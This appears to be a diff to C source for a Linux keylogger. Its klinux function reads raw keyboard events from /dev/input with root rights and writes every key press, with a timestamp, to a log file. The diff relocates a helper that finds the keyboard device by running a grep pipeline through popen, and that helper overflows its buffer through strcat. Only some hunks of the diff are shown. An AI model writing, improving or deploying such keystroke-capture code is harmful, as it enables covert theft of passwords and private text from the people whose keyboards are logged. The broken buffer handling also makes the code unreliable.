@@ -7,15 +7,27 @@
 #include<fcntl.h>
 #include<linux/input.h>
 
-void get_linux_keyboard(char*); // Function to identify system file.
+void get_linux_keyboard(char *keyboard_file)
+{
+  char string1[] = "/dev/input/event" , file_number[4];
+  FILE *fx = NULL ;
+  fx = popen("cat /proc/bus/input/devices | grep -A 4 keyboard | grep event | grep -o '[0-9]*'","r");
+  if( fx == NULL )
+    exit(EXIT_FAILURE); // popen returns NULL if pipe or fork fails.
+
+  fgets(file_number,4,fx);
+  strcat(string1,file_number);
+  strcpy(keyboard_file,string1);
+  keyboard_file[strlen(keyboard_file)-1] = '\0'; // To prevent new-line.
+  pclose(fx);
+}
 
 int klinux(void)
 {
   struct input_event keystroke ;
   char keyboard_file[22] = {0};
   get_linux_keyboard(keyboard_file);
-
-  // System file for keyboard are listed in /dev/input/ and can range from event(0-13) appropriate 'event' can be identified using cat /proc/bus/input/devices | less command
+  // TODO: identify multiply inputs
   int keyboard = open(keyboard_file,O_RDONLY); // This file requires root permission.
   if( keyboard == -1 )
       exit(EXIT_FAILURE); // open returns negative value if it encounters an error.
@@ -38,8 +50,10 @@ int klinux(void)
   while(1)
     {
       read(keyboard,&keystroke,sizeof(keystroke));
-      fflush(fp); 
-      if( keystroke.type == EV_KEY && keystroke.value == 1 ) // keystroke.value represent instance when keys are released , this limit us to condition when user press a key to print key for more than one time our program will only register it as one stroke.
+      fflush(fp);
+      // keystroke.value represent instance when keys are released, this limit us to
+      // condition when user press a key to print key for more than one time our program will only register it as one stroke.
+      if( keystroke.type == EV_KEY && keystroke.value == 1 ) 
 	{
 	  char time[35] = {0}  ;
 	  format_time(time);
@@ -93,24 +107,6 @@ int klinux(void)
 	  fputs("\n",fp);
 	}
     }
-
   fclose(fp);
   return 0 ;
 }
-
-void get_linux_keyboard(char *keyboard_file)
-{
-  char string1[] = "/dev/input/event" , file_number[4];
-  FILE *fx = NULL ;
-  fx = popen("cat /proc/bus/input/devices | grep -A 4 keyboard | grep event | grep -o '[0-9]*'","r");
-  if( fx == NULL )
-    exit(EXIT_FAILURE); // popen returns NULL if pipe or fork fails.
-
-  fgets(file_number,4,fx);
-  strcat(string1,file_number);
-  strcpy(keyboard_file,string1);
-  keyboard_file[strlen(keyboard_file)-1] = '\0'; // To prevent new-line.
-  pclose(fx);
-}
-
-
